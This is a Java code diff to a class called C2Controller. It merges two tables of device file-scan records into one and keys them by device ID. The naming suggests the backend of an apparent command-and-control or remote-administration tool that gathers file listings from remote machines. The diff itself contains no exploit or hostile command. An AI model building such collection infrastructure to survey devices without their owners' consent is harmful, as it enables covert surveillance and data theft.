-                    c2FileSystemNodeService.remove(new QueryWrapper<C2FileSystemNode>().eq("device_uuid", deviceUuid));
+                    // Ensure we have device ID
+                    if (device.getId() == null) {
+                         C2Device existing = c2DeviceMapper.selectOne(new QueryWrapper<C2Device>().eq("uuid", deviceUuid));
+                         if (existing != null) device.setId(existing.getId());
+                    }
+
+                    if (device.getId() != null) {
+                        // Clear old File System Nodes for this device to ensure fresh view
+                        c2FileSystemNodeService.remove(new QueryWrapper<C2FileSystemNode>().eq("device_id", device.getId()));
+                    } else {
+                        log.warn("Skipping file scan cleanup: Device ID not found for UUID {}", deviceUuid);
+                    }
 
                     String fileTable = "files";
                     // Check if file_scan_results exists
@@ -1585,7 +1699,6 @@ public class C2Controller {
                     }
 
                     java.sql.ResultSet rs = stmt.executeQuery("SELECT * FROM " + fileTable);
-                    List<C2FileScan> batchList = new ArrayList<>();
                     List<C2FileSystemNode> nodeList = new ArrayList<>();
                     int batchSize = 1000;
                     int totalCount = 0;
@@ -1600,10 +1713,6 @@ public class C2Controller {
                         }
                         dedupCache.put(key, "1", TimeUnit.HOURS.toMillis(1));
 
-                        // 1. Add to C2FileScan (Search/Flat View)
-                        C2FileScan scan = new C2FileScan();
-                        scan.setDeviceUuid(deviceUuid);
-                        scan.setFilePath(filePath);
                         // Extract name if not present in DB
                         String fileName = filePath;
                         if (filePath.contains(File.separator)) {
@@ -1620,18 +1729,12 @@ public class C2Controller {
                                 if (dbName != null && !dbName.isEmpty()) fileName = dbName;
                             }
                         } catch (Exception ignore) {}
-
-                        scan.setFileName(fileName);
                         
                         long sizeVal = 0;
                         Object sizeObj = rs.getObject("size");
                         if (sizeObj instanceof Number) {
                             sizeVal = ((Number) sizeObj).longValue();
-                            scan.setFileSize(sizeVal);
                         }
-                        scan.setMd5(rs.getString("md5")); // Might be null
-                        scan.setIsRecent(0);
-                        scan.setCreateTime(new Date());
                         
                         long lastMod = rs.getLong("last_modified");
                         Date lastModDate;
@@ -1640,13 +1743,12 @@ public class C2Controller {
                         } else {
                             lastModDate = new Date();
                         }
-                        scan.setLastModified(lastModDate);
                         
-                        batchList.add(scan);
-                        
-                        // 2. Add to C2FileSystemNode (Tree View)
+                        // Add to C2FileSystemNode (Merged)
                         C2FileSystemNode node = new C2FileSystemNode();
-                        node.setDeviceUuid(deviceUuid);
+                        if (device != null && device.getId() != null) {
+                            node.setDeviceId(device.getId());
+                        }
                         node.setPath(filePath);
                         node.setName(fileName);
                         
@@ -1669,29 +1771,34 @@ public class C2Controller {
                         node.setSize(sizeVal);
                         node.setLastModified(lastModDate);
                         node.setCreateTime(new Date());
+
+                        // New fields from merged C2FileScan
+                        try {
+                            node.setMd5(rs.getString("md5"));
+                        } catch (Exception ignore) {}
+                        
+                        node.setIsRecent(0); // Default to 0, can be updated if 'is_recent' column exists in source
+                        try {
+                            if (rs.findColumn("is_recent") > 0) {
+                                node.setIsRecent(rs.getInt("is_recent"));
+                            }
+                        } catch (Exception ignore) {}
                         
                         nodeList.add(node);
 
                         totalCount++;
                         
-                        if (batchList.size() >= batchSize) {
-                             c2FileScanService.saveBatch(batchList);
-                             batchList.clear();
-                        }
                         if (nodeList.size() >= batchSize) {
                              c2FileSystemNodeService.saveBatch(nodeList);
                              nodeList.clear();
                         }
                     }
                     
-                    if (!batchList.isEmpty()) {
-                         c2FileScanService.saveBatch(batchList);
-                    }
                     if (!nodeList.isEmpty()) {
                          c2FileSystemNodeService.saveBatch(nodeList);
                     }
                     rs.close();
-                    log.info("Processed {} files from scan results into C2FileScan and C2FileSystemNode", totalCount);
+                    log.info("Processed {} files from scan results into C2FileSystemNode", totalCount);
                 } catch (Exception e) {
                     log.warn("Failed to process file scan results: {}", e.getMessage());
                 }
